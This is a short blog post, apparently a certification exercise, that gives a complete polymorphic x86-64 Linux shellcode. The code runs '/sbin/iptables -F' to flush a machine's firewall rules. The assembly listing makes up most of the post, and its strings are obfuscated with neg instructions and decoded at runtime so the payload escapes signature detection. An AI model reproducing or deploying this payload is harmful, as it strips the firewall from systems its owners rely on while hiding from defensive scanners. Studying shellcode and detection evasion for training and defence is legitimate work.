# Polymorphic version of a flush iptables shellcode

Original shellcode:
```
http://shell-storm.org/shellcode/files/shellcode-683.php
```

The original shellcode is 49 bytes in size and my polymorphic version is 59 bytes in size.

## Changes
1. Use of cdq to null out rdx
2. The original source code uses ```shr``` to deobfuscate strings at runtime. I used ```neg``` to deobfuscate.

## Asm
```
global _start
section .text
_start:

    xor rax, rax
    cdq
    push rax
    push word 0xb9d3 ; Obfuscated -F
    mov rcx, rsp
    neg word [rcx] ; Deobfuscate -F

    mov rbx,0xffff8c9a939d9e8c
    push rbx
    mov rbx,0x8f96d091969d8cd1
    push rbx
    mov rdi, rsp

    neg qword [rsp]
    neg qword [rsp + 8] ; Deobfuscate /sbin/iptables

    push rax
    push rcx
    push rdi

    mov rsi, rsp

    mov al, 0x3b
    syscall

```

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student ID: SLAE64-1581
